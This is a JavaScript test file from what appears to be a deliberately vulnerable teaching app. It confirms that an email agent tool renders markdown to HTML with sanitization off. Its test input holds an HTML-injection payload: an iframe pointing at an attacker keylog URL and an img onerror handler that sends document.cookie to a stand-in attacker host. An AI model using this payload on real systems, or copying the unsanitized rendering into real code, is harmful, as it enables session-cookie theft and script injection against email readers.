const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability html-injection
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/email/tools/index.js
 *
 * body_markdown → body_html through marked with sanitization off. Raw
 * <iframe>, <img onerror>, <style>, etc. all survive verbatim.
 */
test('html-injection: markdown body → HTML with <iframe> and <img onerror> intact', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { send } = require(path.join(REPO, 'agent-host/agents/email/tools/index.js'));
    const r = await send({
      to: 'alice@shop.local',
      subject: 'update',
      body_markdown: `See this update:\n\n<iframe src="http://attacker/keylog"></iframe>\n\n<img src=x onerror="fetch('http://attacker/?c='+document.cookie)">`,
      from: 'evil@ext',
    });
    assert.equal(r.ok, true);
    assert.match(r.body_html, /<iframe src="http:\/\/attacker\/keylog"><\/iframe>/, 'iframe survives');
    assert.match(r.body_html, /onerror=/, 'onerror handler survives');
  } finally {
    await s.close();
  }
});
